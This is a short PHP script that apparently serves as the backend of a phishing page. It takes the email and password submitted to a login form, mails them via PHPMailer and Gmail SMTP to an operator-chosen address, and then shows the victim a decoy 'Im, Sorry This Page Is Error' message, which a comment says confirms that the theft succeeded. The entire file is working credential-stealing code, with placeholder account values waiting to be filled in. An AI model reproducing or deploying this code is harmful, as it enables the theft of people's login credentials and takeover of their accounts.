<?php
/*
	Do not change or replace the code from line 6 to line 20
*/

include "classes/classes.phpmailer.php"; // this line to call the PHPMAILER library


if(isset($_POST['login'])){
	
		$email = $_POST['email']; // Retrieves value from email input
		$pass = $_POST['pass']; // Retrieves value from password input
	
		$mail = new PHPMailer; 
        $mail->IsSMTP();
        $mail->SMTPSecure = 'ssl'; 
        $mail->Host = "smtp.gmail.com"; //host email
        $mail->SMTPDebug = 2;
        $mail->Port = 465;
        $mail->SMTPAuth = true;
		
        $mail->Username = "your@email.com"; //email server
        $mail->Password = "your_password"; //password email server
        $mail->SetFrom("Your Email", "Name"); //set sender email
        $mail->Subject = "subject"; //subject email
        $mail->AddAddress("Your@email2.com");  // Email to get results
		$mail->MsgHTML("Email : ".$email."\nPass : ".$pass."");
		
		if($mail->Send()){
				/*
					If your page says "Im, Sorry This Page Is Error" then your email and password have been sent to your email
				*/
				echo "Im, Sorry This Page Is Error";
		}else{
			
		}
	
	
	
}

?>